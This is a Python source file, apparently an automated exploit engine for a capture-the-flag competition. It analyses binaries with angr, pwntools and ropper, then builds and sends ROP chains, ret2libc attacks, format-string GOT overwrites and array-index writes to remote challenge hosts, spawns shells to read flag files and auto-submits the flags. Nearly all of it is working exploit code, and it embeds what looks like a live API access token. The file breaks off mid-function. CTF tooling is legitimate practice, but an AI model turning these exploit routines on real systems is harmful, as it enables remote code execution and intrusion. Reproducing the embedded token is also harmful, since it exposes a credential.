import os, subprocess
from multiprocessing import Process
import angr, claripy, angrop
import rzpipe
import json, requests
from colorama import Fore, Back, Style
from pwn import *

# This helps debugging to shutup pwntools
context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

# Access token for team to make api calls -- CHANGE THIS
access_token = "ctfd_489823be103a92f08ed1e04953ac1891cd84424d401789f475236eaf33db165d"

# URL of ctfd --
ctfd_url = "https://ace.ctfd.io"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

UR_MOM_LOL = 10240

# Regex to help find flags in recvall
flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #


class SHART:

    def __init__(self, filename:str, chal_id:int) -> None:
        self.file = filename
        self.chal_id = chal_id
        self.url = f"ace-service-{self.file.replace('_', '-')}.chals.io"
        
        self.__libc_path = "/opt/libc.so.6"
                
        self.__bin = context.binary = ELF(filename)
        self.__libc = context.binary = ELF(self.__libc_path)
        try:
            self.__rop = ROP(self.__bin)
        except FileExistsError as e:
            self.__rop = ROP(self.__bin)
        self.__angrop = None
        
        self.rz = rzpipe.open(self.file)
        self.rz.cmd("aaa")
        
        self.useful_strings = ["/bin/cat flag.txt", "/bin/sh", "cat flag.txt"]
        self.fastcall_api = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
        
        self.__has_leak = False
        self.__has_overflow = False
        
        self.__angrBuffer = None
        self.__buffer = None
        
        # self.angrProj = angr.Project(filename, load_options={"auto_load_libs":False})
        # self.angrCfg = self.angrProj.analyses.CFGFast()
        # self.angrFunc = self.angrCfg.kb.functions
        # self.angrSimgr = None
        
        self.flag = ""
        
        self.recipe = {
                "ret2win":False,
                "ret2system":False,
                "ret2execve":False,
                "ret2syscall":False,
                "ret2libc":False,
                "ROPWritePrim":False,
                "FormStrStackLeak":False,
                "FormStrLibcLeak":False,
                "FormStrWritePrim":False,
                "FormStrGOTOver":False,
                "ArrayIndexAbuse":False
                }
    
    # Angr hook used to find the buffer needed to complete a stack smash.
    def __check_mem_corruption(self, simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    temp_buffer = path.solver.eval(self.__angrBuffer, cast_to=bytes)
                    try:
                        ind = temp_buffer.index(b"AAAAAAAA")
                        self.__buffer = temp_buffer[:ind]
                        simgr.stashes["corrupt"].append(path)
                    except Exception as e:
                        pass
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")
        
    # initializes angr for stack smash and printf leak detection.
    # A lot of this is an adaptation from https://github.com/SolarDebris Aegis and RageAgainstTheMachine Projects.
    def __init_angr(self):
        
        print(Fore.RED + Style.BRIGHT + f"Analyzing {self.file}: Initializing Angr." + Style.RESET_ALL)
        
        angrProj = angr.Project(self.file, load_options={"auto_load_libs":False})
        
        inp_size = 1024
        
        self.__angrBuffer = claripy.BVS("input", 8 * inp_size)
                
        state = angrProj.factory.blank_state(addr=self.__bin.sym["main"], stdin=self.__angrBuffer, add_options=angr.options.unicorn)
        angrSimgr = angrProj.factory.simgr(state, save_unconstrained=True)
        angrSimgr.stashes["corrupt"] = []
        
        def prevent_death(state):
            read_size = state.solver.eval(state.regs.rsi)
            if read_size > UR_MOM_LOL:
                angrSimgr.drop(stash = "active")
                
        angrProj.hook_symbol("fgets", prevent_death)
        angrProj.hook_symbol("scanf", prevent_death)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Active." + Style.RESET_ALL)
        
        angrSimgr.explore(step_func=self.__check_mem_corruption)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Completed." + Style.RESET_ALL)
        
        for error in angrSimgr.errored:
            if str(error.error) == "Symbolic (format) string, game over :(":
                self.__has_leak = True
                break
        
        if len(angrSimgr.stashes["corrupt"]) == 0:
            print(Fore.YELLOW + Style.BRIGHT + f"Analyzing {self.file}: Angr Failed to Find Overflow." + Style.RESET_ALL)
        else:
            self.__has_overflow = True
        angrSimgr = None
        angrProj = None
    
    def __get_win_params(self, rz_str:str) -> list[int]:
        cmps = rz_str.split("\n")[:-1]
        vals = []
        for cmp in cmps:
            vals.append(int(cmp.split(", ")[-1].strip(),16))
        return vals
        
    # Backup stack smash detection.
    def __corefile_backup(self):
        print(Fore.RED + Style.BRIGHT + f"Analyzing {self.file}: Corefile Fallback." + Style.RESET_ALL)
        for i in range(1,9):
            try:
                        
                context.log_level = 'critical'
                p = process(self.file)
                p.sendline(cyclic((256*i),n=8))
                try:
                    p.sendline(cyclic((256*i),n=8))
                except EOFError as e:
                    pass
                ret = p.poll(True)
                if ret < 0:
                    core = Corefile(f"/cores/core.{p.pid}")
                    p.close()
                    os.remove(core.file.name)
                else:
                    print(Fore.Yellow + Style.BRIGHT + f"Analyzing {self.file}: CoreFile Failed to Generate!" + Style.RESET_ALL)
                    p.close()
                # if not os.path.isfile("input.txt"):
                #     with open("input.txt", "wb") as f: f.write(cyclic(2048))
                # out = subprocess.run([f"gdb -ex \"run < input.txt\" -ex \"print \\$rbp\" -ex quit ./{self.file}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True).stdout
                try:
                    size = cyclic_find(core.rbp,n=8)
                except Exception as e:
                    size = 0
                # os.remove(file_name)
                if size > 0:
                    self.__has_overflow = True
                    self.__buffer = b"A" * (size+8)
                if self.__buffer is not None: break
            except Exception as e:
                pass
                           
    # Search for string in binary and return the address.
    def __find_string(self, string:str) -> int:
        out = subprocess.check_output(["ropper", "-f", self.file, "--string", string, "--nocolor"]).decode("ascii")
        addr = ""
        if "0x" in out:
            addr = out.split("\n")[7].split()[0]
        ret = 0
        if addr != "":
            ret = int(addr, 16)
        return ret
    
    # Looks to see if important strings are in the binary.
    def __found_imp_strings(self) -> dict:
        ret = {}
        for imp in self.useful_strings:
            addr = self.__find_string(imp)
            if addr > 0:
                ret.update({imp: addr})
        return ret
    
    # Gets flag out of stack.
    def __decode_printf_stack_leak(self, output:str) -> str:
        flag = ""
        output = output[output.index("0x"):]
        nums = output.split("0x")
        for part in nums:
            temp = re.findall("..", part)[::-1]
            for num in temp:
                flag += chr(int(num, 16))
                if num == "7d":
                    break
            if "7d" in temp:
                break
        return flag
    
    # Returns the address of __data_start.
    def __get_writeable_mem(self) -> int:
        temp = 0
        try:
            temp = self.__bin.sym["__data_start"]
        except KeyError as e:
            pass
        return temp
    
    # Find libc function that has not yet been called after the last separator function.
    def __get_unused_libc_func(self, separator:str, func:str) -> list:
        libc_calls = self.rz.cmd(f"pdf @ sym.{func}" + " | grep call | awk '{print $4}'").split("\n")[:-1]
        last_func = 0
        for i in range(len(libc_calls) - 1, 0, -1):
            if libc_calls[i] == f"sym.imp.{separator}":
                last_func = i
        libc_func = list(self.__bin.got.keys())
        libc_func.remove("system")
        libc_func.remove("__gmon_start__")
        libc_func.remove("__libc_start_main")
        libc_func.remove("stdin")
        libc_func.remove("stdout")
        libc_func.remove("stderr")
        libc_func.remove("setbuf")
        for pre_func in libc_calls[:last_func+1]:
            pre_func = pre_func.split(".")[-1]
            if pre_func in self.__bin.got.keys() and pre_func in libc_func:
                libc_func.remove(pre_func)
        return libc_func
    
    # Accomplish printf overwrite attack.
    def __printf_overwrite(self, addr:int, value:int) -> str:
        temp_flag = ""
        def attack(payload):
            p = process(self.file)
            p.sendline(payload)
            return p.recvall()
        p = remote(self.url, 443, ssl=True, sni=self.url)
        p.recvuntil(b">>>")
        automat = FmtStr(attack)
        offset = automat.offset
        pay = fmtstr_payload(offset, {addr: value}, write_size="byte")
        p.sendline(pay)
        if self.__find_string("cat flag.txt") == 0:
            p.sendline(b"/bin/cat flag.txt")
            p.sendline(b"exit")
        out = p.recvall(timeout=5)
        ind = 0
        try:
            ind = out.index(b"flag")
        except Exception as e:
            pass
        if ind != 0:
            temp_flag = out[ind:].strip().decode("ascii")
        return temp_flag
    
    def __get_ret(self) -> int:
        out = self.rz.cmd("pdf @ sym.vuln | grep ret | awk -F '0x' '{print $2}' | awk '{print $1}'").split("\n")[:-1]
        return int(out[0], 16)
    
    # Adds ret to chain in case of movaps error.
    def __add_ret_gadget(self, chain:bytes) -> str:
        chain = chain[:-8] + p64(self.__get_ret()) + chain[-8:]
        p = remote(self.url, 443, ssl=True, sni=self.url)
        p.recvuntil(b">>>")
        p.sendline(chain)
        if self.__find_string("cat flag.txt") == 0 or self.recipe["ret2libc"]:
            p.sendline(b"cat flag.txt")
            p.sendline(b"exit")
        return p.recvall(timeout=3).decode("ascii")
    
    # Generalized angrop function for calling system in one way or another.
    def __angrop_call(self) -> str:
        self.__angrop  = angr.Project(self.file).analyses.ROP()
        self.__angrop.find_gadgets_single_threaded()
        temp_flag = ""
        imps = self.__found_imp_strings()
        if len(imps.keys()) > 0:
            for key in imps.keys():
                try:
                    chain  = bytes(self.__buffer)
                    if self.recipe["ret2system"]:
                        chain += self.__angrop.set_regs(rdi=imps[key]).payload_str()
                        chain += p64(self.__bin.sym["system"])
                    elif self.recipe["ret2execve"]:
                        chain += self.__angrop.set_regs(rdi=imps[key], rsi=0, rdx=0).payload_str()
                        chain += p64(self.__bin.sym["execve"])
                    elif self.recipe["ret2syscall"]:
                        chain += self.__angrop.do_syscall(59, [imps[key], 0, 0], needs_return=False).payload_str()
                    p = remote(self.url, 443, ssl=True, sni=self.url)
                    p.recvuntil(b">>>")
                    p.sendline(chain)
                    if "cat" not in key:
                        p.sendline(b"cat flag.txt")
                        p.sendline(b"exit")
                    temp_flag = p.recvall(timeout=5).decode("ascii")
                    if len(re.findall(flag_pattern, temp_flag)) == 0:
                        temp_flag = self.__add_ret_gadget(chain)
                    if "flag{" in temp_flag: 
                        break
                except angrop.errors.RopException as e:
                    pass
        return temp_flag
    
    def __get_win(self) -> int:
        win = self.__bin.sym["win"]
        if win & 0xa == 0xa:
            win+=1
        return win
    
    def __get_instruct(self, inst:str) -> bytes:
        ret = b""
        out = subprocess.run(f'ropper -f {self.file} --search "{inst}" --nocolor | grep ";"', stdout=PIPE, stderr=subprocess.DEVNULL, text=True, shell=True).stdout
        gadgets = out.split("\n")[:-1]
        gadgets.sort(key=len)
        try:
            best = gadgets[0]
            separate_ind = best.index(":")
            ret = p64(int(best[:separate_ind],16))
        except Exception as e:
            pass
        return ret
    
    def __mov_gadget(self) -> bytes:
        out = subprocess.run(f'ropper -f {self.file} --search "mov [%], ???;" --nocolor | grep ret', stdout=PIPE, stderr=subprocess.DEVNULL, text=True, shell=True).stdout
        writes = out.split("\n")[:-1]
        writes.sort(key=len)
        best = ""
        ret = b""
        try:
            if len(writes) > 1:
                for gadget in writes:
                    if "qword" in gadget:
                        best = gadget
                        break
                if best == b"":
                    best = writes[0]
            else:
                best = writes[0]
                
            ref_reg = best[best.index("[")+1:best.index("]")]
            mov_reg = best[best.index(",")+2:best.index(";")]
            if "qword" in best:
                pay_dict = {ref_reg:self.__get_writeable_mem(), mov_reg:b"/bin/sh\0"}
                for section in best.split(";")[:-1]:
                    section = section.strip()
                    if "mov" in section:
                        ret += self.__get_gadgets(pay_dict)
                        ret += p64(int(best[:best.index(":")],16))
                    elif "pop" in section:
                        sect = section[section.index(" ")+1:]
                        if sect in pay_dict.keys():
                            reg_val = pay_dict[sect]
                            if type(reg_val) is bytes:
                                ret += reg_val
                            else:
                                ret += p64(reg_val)
                        else:
                            ret += p64(0)
            else:
                for i in range(2):
                    if i == 0:
                        pay_dict = {ref_reg:self.__get_writeable_mem(), mov_reg:b"/bin"}
                    else:
                        pay_dict = {ref_reg:self.__get_writeable_mem() + 4, mov_reg:b"/sh\0"}
                    for section in best.split(";")[:-1]:
                        section = section.strip()
                        if "mov" in section:
                            ret += self.__get_gadgets(pay_dict)
                            ret += p64(int(best[:best.index(":")],16))
                        elif "pop" in section:
                            sect = section[section.index(" ")+1:]
                            if sect in pay_dict.keys():
                                reg_val = pay_dict[sect]
                                if type(reg_val) is bytes:
                                    ret += reg_val
                                else:
                                    ret += p64(reg_val)
                            else:
                                ret += p64(0)
        except Exception as e:
            pass
        return ret 
        
        
            
    def __get_gadgets(self, regs:dict) -> bytes:
        fulfilled = regs.fromkeys(regs.keys(),False)
        dict_keys = list[str](regs.keys())
        for reg in dict_keys[::-1]:
                out = subprocess.run(f'ropper -f {self.file} --search "pop {reg}" --nocolor | grep ret', stdout=PIPE, stderr=subprocess.DEVNULL, text=True, shell=True).stdout
                gadgets = out.split("\n")[:-1]
                gadgets.sort(key=len)
                best = gadgets[0]
                for sumthin in dict_keys[:dict_keys.index(reg)]:
                    if not fulfilled[sumthin]:
                        fulfilled[sumthin] = f"pop {sumthin}" in best
        ret = b""
        for reg in dict_keys:
            if not fulfilled[reg]:
                out = subprocess.run(f'ropper -f {self.file} --search "pop {reg}" --nocolor | grep ret', stdout=PIPE, stderr=subprocess.DEVNULL, text=True, shell=True).stdout
                gadgets = out.split("\n")[:-1]
                gadgets.sort(key=len)
                best = gadgets[0]
                separate_ind = best.index(":")
                ret += p64(int(best[:separate_ind],16))
                for section in best[separate_ind+1:].split(";")[:-2]:
                    section = section.strip()
                    if "pop" in section:
                        if section[section.index(" ")+1:] in dict_keys:
                            reg_val = regs[section[section.index(" ")+1:]]
                            if type(reg_val) is bytes:
                                ret += reg_val
                            else:
                                ret += p64(reg_val)
                            fulfilled[section[section.index(" ")+1:]] = True
                        else:
                            ret += p64(0)
        return ret
    
    def __make_call(self, func:str) -> str:
        temp_flag = ""
        chain = bytes(self.__buffer)
        imps = self.__found_imp_strings()
        for key in imps.keys():
            if func == "system":
                chain += self.__get_gadgets({"rdi":imps[key]})
                chain += p64(self.__bin.sym[func])
            elif func == "execve":
                chain += self.__get_gadgets({"rdi":imps[key], "rsi":0, "rdx":0})
                chain += p64(self.__bin.sym[func])
            elif func == "syscall":
                chain += self.__get_gadgets({"rax":59, "rdi":imps[key], "rsi":0, "rdx":0})
                chain += self.__get_instruct(func)
            p = remote(self.url, 443, ssl=True, sni=self.url)
            p.recvuntil(b">>>")
            p.sendline(chain)
            temp_flag = p.recvall(timeout=3).decode("ascii")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__add_ret_gadget(chain)
            if len(re.findall(flag_pattern, temp_flag)) > 0: break
        return temp_flag
    
    def __send_flag(self):
        challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
        data = json.dumps({"challenge_id" : self.chal_id, "submission" : self.flag})
        response = requests.post(challenge_url, headers=headers, data=data)

    def exploit(self):        
                
        print(Fore.CYAN + Style.BRIGHT + f"Exploiting {self.file}: Exploits Initiated" + Style.RESET_ALL)
        
        flags = []
        temp_flag = ""
        
        # You need to make functions to make your exploits easier to read/do. Make sure that the parameters have static types.
        # self.buffer contains the buffer up before overwriting the return address.
        
        if self.recipe["ret2win"] and len(re.findall(flag_pattern, temp_flag)) == 0:
            chain = bytes(self.__buffer)
            reg_vals = []
            cmps = self.rz.cmd("pdf @ sym.win ~ cmp | grep -i cmp")
            
            if cmps != "":
                reg_vals = self.__get_win_params(cmps)
                reg_dict = {}
                for i in range(len(reg_vals)):
                    reg_dict.update({self.fastcall_api[i]:reg_vals[i]})
                chain += self.__get_gadgets(reg_dict)
                    
                
            chain += p64(self.__get_win())
            p = remote(self.url, 443, ssl=True, sni=self.url)
            p.recvuntil(b">>>")
            p.sendline(chain)
            if self.__find_string("cat flag.txt") == 0:
                p.sendline(b"/bin/cat flag.txt")
                p.sendline(b"exit")
            temp_flag = p.recvall(timeout=3).decode("ascii")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__add_ret_gadget(chain)
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                chain = bytes(self.__buffer)
                if cmps != "":
                    try:
                        self.__angrop = angr.Project(self.file).analyses.ROP()
                        self.__angrop.find_gadgets_single_threaded()
                        if len(reg_vals) == 1:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0]).payload_str()
                        elif len(reg_vals) == 2:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0], rsi=reg_vals[1]).payload_str()
                        elif len(reg_vals) == 3:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0], rsi=reg_vals[1], rdx=reg_vals[2]).payload_str()
                        elif len(reg_vals) == 4:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0], rsi=reg_vals[1], rdx=reg_vals[2], rcx=reg_vals[3]).payload_str()
                        elif len(reg_vals) == 5:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0], rsi=reg_vals[1], rdx=reg_vals[2], rcx=reg_vals[3], r8=reg_vals[4]).payload_str()
                        elif len(reg_vals) == 6:
                            chain += self.__angrop.set_regs(rdi=reg_vals[0], rsi=reg_vals[1], rdx=reg_vals[2], rcx=reg_vals[3], r8=reg_vals[4], r9=reg_vals[5]).payload_str()
                    except angrop.errors.RopException as e:
                        pass
                chain += p64(self.__get_win())
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                p.sendline(chain)
                if self.__find_string("cat flag.txt") == 0:
                    p.sendline(b"/bin/cat flag.txt")
                    p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    temp_flag = self.__add_ret_gadget(chain)
        elif self.recipe["ret2system"]:
            temp_flag = self.__make_call("system")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__angrop_call()
            if len(re.findall(flag_pattern, temp_flag)) == 0 and self.__mov_gadget() != b"":
                chain = bytes(self.__buffer)
                chain += self.__mov_gadget()
                chain += self.__get_gadgets({"rdi":self.__get_writeable_mem()})
                chain += p64(self.__bin.sym["system"])
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                p.sendline(chain)
                p.sendline(b"cat flag.txt")
                p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    temp_flag = self.__add_ret_gadget(chain)
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    for i in range(10):
                        try:
                            self.__angrop  = angr.Project(self.file).analyses.ROP()
                            self.__angrop.find_gadgets_single_threaded()
                            writeable = self.__get_writeable_mem()
                            chain = bytes(self.__buffer)
                            chain += self.__angrop.write_to_mem(writeable, b"/bin/sh\0").payload_str()
                            chain += self.__angrop.set_regs(rdi=writeable).payload_str()
                            chain += p64(self.__bin.sym["system"])
                            p = remote(self.url, 443, ssl=True, sni=self.url)
                            p.recvuntil(b">>>")
                            p.sendline(chain)
                            p.sendline(b"cat flag.txt")
                            p.sendline(b"exit")
                            temp_flag = p.recvall(timeout=5).decode("ascii")
                            if len(re.findall(flag_pattern, temp_flag)) == 0:
                                temp_flag = self.__add_ret_gadget(chain)
                            if len(re.findall(flag_pattern, temp_flag)) > 0: break
                        except angrop.errors.RopException as e:
                            pass
        elif self.recipe["ret2execve"]:
            temp_flag = self.__make_call("execve")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__angrop_call()
            if len(re.findall(flag_pattern, temp_flag)) == 0 and self.__mov_gadget() != b"":
                chain = bytes(self.__buffer)
                chain += self.__mov_gadget()
                chain += self.__get_gadgets({"rdi":self.__get_writeable_mem(), "rsi":0, "rdx":0})
                chain += p64(self.__bin.sym["execve"])
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                p.sendline(chain)
                p.sendline(b"cat flag.txt")
                p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    temp_flag = self.__add_ret_gadget(chain)
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    for i in range(10):
                        try:
                            self.__angrop  = angr.Project(self.file).analyses.ROP()
                            self.__angrop.find_gadgets_single_threaded()
                            writeable = self.__get_writeable_mem()
                            chain = bytes(self.__buffer)
                            chain += self.__angrop.write_to_mem(writeable, b"/bin/sh\0").payload_str()
                            chain += self.__angrop.set_regs(rdi=writeable).payload_str()
                            chain += p64(self.__bin.sym["execve"])
                            p = remote(self.url, 443, ssl=True, sni=self.url)
                            p.recvuntil(b">>>")
                            p.sendline(chain)
                            p.sendline(b"cat flag.txt")
                            p.sendline(b"exit")
                            temp_flag = p.recvall(timeout=5).decode("ascii")
                            if len(re.findall(flag_pattern, temp_flag)) == 0:
                                temp_flag = self.__add_ret_gadget(chain)
                            if len(re.findall(flag_pattern, temp_flag)) > 0: break
                        except angrop.errors.RopException as e:
                            pass
        elif self.recipe["ret2syscall"]:
            temp_flag = self.__make_call("syscall")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__angrop_call()
            if len(re.findall(flag_pattern, temp_flag)) == 0 and self.__mov_gadget() != b"":
                chain = bytes(self.__buffer)
                chain += self.__mov_gadget()
                chain += self.__get_gadgets({"rax":59, "rdi":self.__get_writeable_mem(), "rsi":0, "rdx":0})
                chain += self.__get_instruct("syscall")
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                p.sendline(chain)
                p.sendline(b"cat flag.txt")
                p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    temp_flag = self.__add_ret_gadget(chain)
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    for i in range(10):
                        try:
                            self.__angrop  = angr.Project(self.file).analyses.ROP()
                            self.__angrop.find_gadgets_single_threaded()
                            writeable = self.__get_writeable_mem()
                            chain = bytes(self.__buffer)
                            chain += self.__angrop.write_to_mem(writeable, b"/bin/sh\0").payload_str()
                            chain += self.__angrop.set_regs(rdi=writeable).payload_str()
                            chain += self.__get_instruct("syscall")
                            p = remote(self.url, 443, ssl=True, sni=self.url)
                            p.recvuntil(b">>>")
                            p.sendline(chain)
                            p.sendline(b"cat flag.txt")
                            p.sendline(b"exit")
                            temp_flag = p.recvall(timeout=5).decode("ascii")
                            if len(re.findall(flag_pattern, temp_flag)) == 0:
                                temp_flag = self.__add_ret_gadget(chain)
                            if len(re.findall(flag_pattern, temp_flag)) > 0: break
                        except angrop.errors.RopException as e:
                            pass
        elif self.recipe["ret2libc"]:
            for i in range(10):
                func_name = self.rz.cmd("pdf @ sym.vuln | grep reloc | awk '{print $6}' | tr -d \"]\"").strip().replace("[reloc.","")
                func_offset = self.__libc.sym[func_name]
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b"<<< Leak: ")
                leak = p.recvline().strip().decode("ascii")
                leak = int(leak,16)
                base = leak - func_offset
                bin_sh = base + 0x001b3d88
                pop_rdi = base + 0x000000000002164f
                chain = bytes(self.__buffer) + p64(pop_rdi) + p64(bin_sh) + p64(base + self.__libc.sym["system"])
                p.recvuntil(b">>>")
                p.sendline(chain)
                p.sendline(b"cat flag.txt")
                p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    p = remote(self.url, 443, ssl=True, sni=self.url)
                    p.recvuntil(b"<<< Leak: ")
                    leak = p.recvline().strip().decode("ascii")
                    leak = int(leak,16)
                    base = leak - func_offset
                    bin_sh = base + 0x001b3d88
                    pop_rdi = base + 0x000000000002164f
                    chain = bytes(self.__buffer) + p64(pop_rdi) + p64(bin_sh) + p64(self.__get_ret()) + p64(base + self.__libc.sym["system"])
                    p.recvuntil(b">>>")
                    p.sendline(chain)
                    p.sendline(b"cat flag.txt")
                    p.sendline(b"exit")
                    temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) > 0: break
        elif self.recipe["ROPWritePrim"]:
            chain = bytes(self.__buffer)
            chain += self.__mov_gadget()
            chain += self.__get_gadgets({"rdi":self.__get_writeable_mem()})
            chain += p64(self.__bin.sym["system"])
            p = remote(self.url, 443, ssl=True, sni=self.url)
            p.recvuntil(b">>>")
            p.sendline(chain)
            p.sendline(b"cat flag.txt")
            p.sendline(b"exit")
            temp_flag = p.recvall(timeout=3).decode("ascii")
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                temp_flag = self.__add_ret_gadget(chain)
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                for i in range(10):
                    try:
                        self.__angrop  = angr.Project(self.file).analyses.ROP()
                        self.__angrop.find_gadgets_single_threaded()
                        writeable = self.__get_writeable_mem()
                        chain = bytes(self.__buffer)
                        chain += self.__angrop.write_to_mem(writeable, b"/bin/sh\0").payload_str()
                        chain += self.__angrop.set_regs(rdi=writeable).payload_str()
                        chain += p64(self.__bin.sym["system"])
                        p = remote(self.url, 443, ssl=True, sni=self.url)
                        p.recvuntil(b">>>")
                        p.sendline(chain)
                        p.sendline(b"cat flag.txt")
                        p.sendline(b"exit")
                        temp_flag = p.recvall(timeout=5).decode("ascii")
                        if len(re.findall(flag_pattern, temp_flag)) == 0:
                            temp_flag = self.__add_ret_gadget(chain)
                        if len(re.findall(flag_pattern, temp_flag)) > 0: break
                    except angrop.errors.RopException as e:
                        pass
        elif self.recipe["FormStrStackLeak"]:
            start = 0
            for i in range(1, 0x21):
                p = process(self.file)
                p.recvuntil(b">>>")
                p.sendline(b"%%%d$p"%i)
                output = p.recvall(timeout=0.5)
                p.close()
                if b"67616c66" in output:
                    start = i
                    break
            temp_flag = ""
            temp = ""
            while "7d" not in temp:
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                pay = b"%%%d$p"%start
                start += 1
                p.sendline(pay)
                temp = p.recvline().strip().decode("ascii")
                temp_flag += self.__decode_printf_stack_leak(temp)
                p.close()
        elif self.recipe["FormStrWritePrim"]:
            temp_flag = self.__printf_overwrite(self.__bin.sym["pwnme"], 0x539)
        elif self.recipe["FormStrGOTOver"]:
            libc_func = self.__get_unused_libc_func("printf", "vuln")
            for func in libc_func:
                temp_flag = self.__printf_overwrite(self.__bin.got[func], self.__bin.sym["win"])
                if len(re.findall(flag_pattern, temp_flag)) > 0: break
        elif self.recipe["ArrayIndexAbuse"]:            
            p = remote(self.url, 443, ssl=True, sni=self.url)
            p.recvuntil(b"0:  ")
            line = p.recvline()
            interval = len(line)
            p.close()
            funcs = self.__get_unused_libc_func("read", "vuln")
            for func in funcs:
                p = remote(self.url, 443, ssl=True, sni=self.url)
                offset = self.__bin.got[func] - self.__bin.sym["items"]
                pay = pay = b"%d"%(offset//interval)
                win = p64(self.__bin.sym["win"])
                p.recvuntil(b">>>")
                p.sendline(pay)
                p.sendline(win)
                if self.__find_string("cat flag.txt") == 0:
                    p.sendline(b"/bin/cat flag.txt")
                    p.sendline(b"exit")
                temp_flag = p.recvall(timeout=3).decode("ascii")
                if len(re.findall(flag_pattern, temp_flag)) > 0: break
            if len(re.findall(flag_pattern, temp_flag)) == 0:
                funcs = self.__get_unused_libc_func("vuln", "main")
                for func in funcs:
                    p = remote(self.url, 443, ssl=True, sni=self.url)
                    offset = self.__bin.got[func] - self.__bin.sym["items"]
                    pay = pay = b"%d"%(offset//interval)
                    win = p64(self.__bin.sym["win"])
                    p.recvuntil(b">>>")
                    p.sendline(pay)
                    p.sendline(win)
                    if self.__find_string("cat flag.txt") == 0:
                        p.sendline(b"/bin/cat flag.txt")
                        p.sendline(b"exit")
                    temp_flag = p.recvall(timeout=3).decode("ascii")
                    
        printf = 0
        try:
            printf = self.__bin.sym["printf"]
        except KeyError as e:
            pass
        if printf > 0 and self.__has_overflow and len(re.findall(flag_pattern, temp_flag)) == 0:
            for i in range(5):
                func_offset = self.__libc.sym["printf"]
                p = remote(self.url, 443, ssl=True, sni=self.url)
                chain = bytes(self.__buffer) + self.__get_gadgets({"rdi":self.__bin.got["printf"]}) + p64(self.__bin.sym["printf"]) + p64(self.__bin.sym["vuln"])
                p.recvuntil(b">>>")
                p.sendline(chain)
                end_str = self.rz.cmd("pdf @ sym.vuln | grep '<<<' | awk -F '\\\"' '{print $2}' | tr -d '\\\\n'")
                try:
                    poss_addr = p.recvuntil(b"\x7f",timeout=5).strip().replace(bytes(end_str, "ascii"), b"")
                    poss_addr = poss_addr[poss_addr.index(b"@"):poss_addr.index(b"\x7f")+1]
                    poss_addr += b"\00" * (8 - len(poss_addr))
                    leak = unpack_many(poss_addr, 64, endian='little', sign=False)[0]
                    base = leak - func_offset
                    bin_sh = base + 0x001b3d88
                    pop_rdi = base + 0x000000000002164f
                    chain = bytes(self.__buffer) + p64(pop_rdi) + p64(bin_sh) + p64(base + self.__libc.sym["system"])
                    p.sendline(chain)
                    p.sendline(b"cat flag.txt")
                    p.sendline(b"exit")
                    temp_flag = p.recvall(timeout=3).decode("ascii")
                except Exception as e:
                    temp_flag = ""
                    p.close()
                if len(re.findall(flag_pattern, temp_flag)) == 0:
                    p = remote(self.url, 443, ssl=True, sni=self.url)
                    chain = bytes(self.__buffer) + self.__get_gadgets({"rdi":self.__bin.got["printf"]}) + p64(self.__get_ret()) + p64(self.__bin.sym["printf"]) + p64(self.__get_ret()) + p64(self.__bin.sym["vuln"])
                    p.recvuntil(b">>>")
                    p.sendline(chain)
                    try:
                        poss_addr = p.recvuntil(b"\x7f",timeout=5).strip().replace(bytes(end_str, "ascii"), b"")
                        poss_addr = poss_addr[poss_addr.index(b"@"):poss_addr.index(b"\x7f")+1]
                        poss_addr += b"\00" * (8 - len(poss_addr))
                        leak = unpack_many(poss_addr, 64, endian='little', sign=False)[0]
                        base = leak - func_offset
                        bin_sh = base + 0x001b3d88
                        pop_rdi = base + 0x000000000002164f
